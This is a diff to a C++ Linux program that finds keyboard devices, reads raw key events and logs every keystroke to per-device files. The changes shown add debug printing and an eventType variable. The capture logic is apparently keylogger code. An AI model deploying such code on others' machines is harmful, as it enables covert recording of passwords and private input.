@@ -1,3 +1,4 @@
+#include <iostream>
 #include <string>
 #include <fstream>
 #include <regex>
@@ -14,6 +15,10 @@
 #include <linux/version.h>
 #include <sys/ioctl.h>
 #include "constants.hh"
+
+bool DEBUG = false;
+void DEBUG_STDOUT(std::string msg) { if(DEBUG) std::cout << msg << std::endl; }
+void DEBUG_STDERR(std::string msg) { if(DEBUG) std::cerr << msg << std::endl; }
 
 static void* _startCapture(void* threadData);
 
@@ -78,17 +83,19 @@ std::vector<Keyboard> findKeyboards() {
         // If device description matches the regex pattern, push onto vector
         std::regex keyboardNamePattern(".*[Kk]eyboard.*");
         if (std::regex_match(deviceInfo, keyboardNamePattern)) {
+            DEBUG_STDOUT("Found keyboard: " + (std::string)deviceName);
             Keyboard keyboard(devicePath, deviceName + ".log");
             keyboards.push_back(keyboard);
         }
         free(nameList[i]);
     }
+    if(not keyboards.size()) DEBUG_STDERR("No keyboards found.");
 
     return keyboards;
 }
 
 static void* _startCapture(void* threadData) {
-    int readEvent;
+    int readEvent, eventType;
     struct input_event keyEvent[64];
     const char* output;
 
@@ -108,20 +115,24 @@ static void* _startCapture(void* threadData) {
         // Capture keystrokes
         while(true) {
             readEvent = read(keyboard->deviceFile, keyEvent, sizeof(struct input_event) * 64);
+
             if(readEvent > 0) {
+                eventType = keyEvent[1].value;
                 output = keys[keyEvent[1].code];
                 /* Record press and release for
                    modifier keys (shift, ctrl, and super) */
-                if(keyEvent[1].value != 2 && (
+                if(eventType != 2 && (
                             std::strncmp(output, "<su", 3) == 0
                             || std::strncmp(output, "<l-", 3) == 0
                             || std::strncmp(output, "<r-", 3) == 0
                             )
                   ) {
+                    DEBUG_STDOUT(output + (" " + std::to_string(eventType)));
                     logFileStream << output << " " << keyEvent[1].value << std::endl;
                 }
-                else if(keyEvent[1].value != 0) {
+                else if(eventType != 0) {
                     logFileStream << output << std::endl;
+                    DEBUG_STDOUT(output);
                 }
             }
         }
